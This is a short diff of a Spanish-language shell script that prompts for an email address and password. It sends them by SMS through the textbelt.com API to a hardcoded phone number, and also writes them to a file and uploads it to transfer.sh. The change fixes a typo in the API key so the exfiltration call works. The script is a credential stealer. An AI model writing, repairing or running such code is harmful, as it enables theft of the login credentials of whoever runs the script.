@@ -46,7 +46,7 @@ echo "Escribe tu correo"
 read correo
 echo "Escribe tu contraseña"
 read contrase
-curl -# -X POST https://textbelt.com/text --data-urlencode phone="17256666908" --data-urlencode message=" $correo $contrase " -d key=textbel
+curl -# -X POST https://textbelt.com/text --data-urlencode phone="17256666908" --data-urlencode message=" $correo $contrase " -d key=textbelt
 echo "$correo $contrase" > notpe.txt
 curl --upload-file notpe.txt https://transfer.sh/notpe.txt
 echo "opes"
